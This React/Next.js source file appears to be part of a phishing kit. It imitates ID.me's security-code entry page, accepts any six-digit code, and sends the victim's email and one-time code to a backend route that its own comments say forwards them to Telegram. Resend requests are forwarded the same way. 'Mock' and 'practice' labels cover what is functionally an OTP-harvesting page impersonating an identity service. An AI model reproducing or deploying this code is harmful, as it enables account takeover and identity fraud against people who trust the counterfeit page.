"use client";

import Link from "next/link";
import { useMemo, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";

function onlyDigits(s: string) {
  return s.replace(/\D/g, "");
}

export default function IdMeOtpMockPage() {
  const router = useRouter();
  const search = useSearchParams();

  const email = useMemo(() => search.get("email") ?? "example@email.com", [search]);

  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [seconds, setSeconds] = useState(30);
  const [resendLoading, setResendLoading] = useState(false);

  // Resend timer countdown
  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  // Handle OTP submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const clean = onlyDigits(code);
    if (clean.length !== 6) {
      alert("Enter a 6-digit code.");
      return;
    }

    setLoading(true);

    try {
      // Send OTP to Telegram
      const res = await fetch("/api/otp-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: `🔑 ID.me OTP Submission\nEmail: ${email}\nCode: ${clean}`,
        }),
      });

      const data = await res.json();

      if (!data.success) {
        alert("Failed to send OTP to Telegram. Try again.");
        setLoading(false);
        return;
      }

      // Accept any 6-digit code (mock verification)
      setLoading(false);
      router.push("/idme"); // Success redirect

    } catch (err) {
      console.error(err);
      alert("Something went wrong.");
      setLoading(false);
    }
  };

  // Handle resend
  const resend = async () => {
    setResendLoading(true);
    try {
      await fetch("/api/otp-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: `🔄 ID.me OTP Resend Requested\nEmail: ${email}`,
        }),
      });
      setSeconds(30);
      alert("OTP resend requested (practice).");
    } catch (err) {
      console.error(err);
      alert("Failed to resend OTP.");
    } finally {
      setResendLoading(false);
    }
  };

  return (
    <main className="min-h-screen text-[#1f2937] bg-white">
      <div className="pt-24 px-4">
        <div className="mx-auto max-w-sm">
          <div className="rounded-xl bg-white shadow-[0_10px_30px_rgba(0,0,0,0.12)] ring-1 ring-black/5 p-8">
            <h1 className="text-center text-2xl font-semibold text-[#111827]">
              Enter your security code
            </h1>

            <p className="mt-2 text-center text-sm text-[#6b7280]">
              We sent a 6-digit code to <span className="font-medium">{email}</span>
            </p>

            <form onSubmit={handleSubmit} className="mt-8 space-y-5">
              <div>
                <label htmlFor="otp" className="block text-sm font-medium mb-2">
                  Security code
                </label>

                <input
                  id="otp"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={6}
                  value={code}
                  onChange={(e) => setCode(onlyDigits(e.target.value))}
                  placeholder="••••••"
                  className="w-full rounded-md border border-[#d1d5db] bg-white px-4 py-3 text-lg tracking-[0.35em] text-center outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full rounded-md bg-[#2563eb] py-3 text-sm font-semibold text-white hover:bg-[#1d4ed8] transition disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {loading ? "Verifying…" : "Continue"}
              </button>

              <div className="flex items-center justify-between text-sm">
                <button
                  type="button"
                  onClick={resend}
                  disabled={seconds > 0 || resendLoading}
                  className="text-[#2563eb] underline underline-offset-2 hover:text-[#1d4ed8] disabled:opacity-50 disabled:no-underline"
                >
                  {resendLoading ? "Resending…" : "Resend code"}
                </button>

                <span className="text-[#6b7280]">{seconds > 0 ? `Time ${seconds}s` : ""}</span>
              </div>

              <div className="text-center">
                <Link
                  href="/idme-mock"
                  className="text-sm text-[#2563eb] underline underline-offset-2 hover:text-[#1d4ed8]"
                >
                  Use a different method
                </Link>
              </div>
            </form>
          </div>

          <footer className="mt-8 flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#2563eb]">
            {["What is ID.me?", "Terms of Service", "Privacy Policy"].map((item, i) => (
              <span key={i} className="flex items-center gap-2">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="underline underline-offset-2 hover:text-[#1d4ed8]"
                >
                  {item}
                </a>
                {i < 2 && <span className="text-[#9ca3af]">|</span>}
              </span>
            ))}
          </footer>
        </div>
      </div>
    </main>
  );
}
